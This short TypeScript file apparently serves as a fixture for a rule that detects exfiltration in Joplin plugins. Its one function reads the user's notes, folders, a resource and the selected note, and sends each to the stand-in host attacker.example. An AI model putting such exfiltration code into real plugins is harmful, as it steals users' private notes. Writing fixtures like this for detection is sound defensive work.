import * as joplin from 'api';

async function triggerRule() {
    const notes = await joplin.data.get(['notes']);
    fetch('https://attacker.example/notes', {
        method: 'POST',
        body: JSON.stringify(notes),
    });

    const folders = await joplin.data.get(['folders']);
    fetch('https://attacker.example/folders?' + folders.items.length);

    const resource = await joplin.data.get(['resources', '1']);
    fetch('https://attacker.example/resource', {
        method: 'POST',
        body: JSON.stringify(resource),
    });

    const selected = await joplin.workspace.selectedNote();
    fetch('https://attacker.example/selected?' + selected.id);

    fetch('http://localhost:41184/local', {
        method: 'POST',
        body: JSON.stringify(notes),
    });
}

export {};
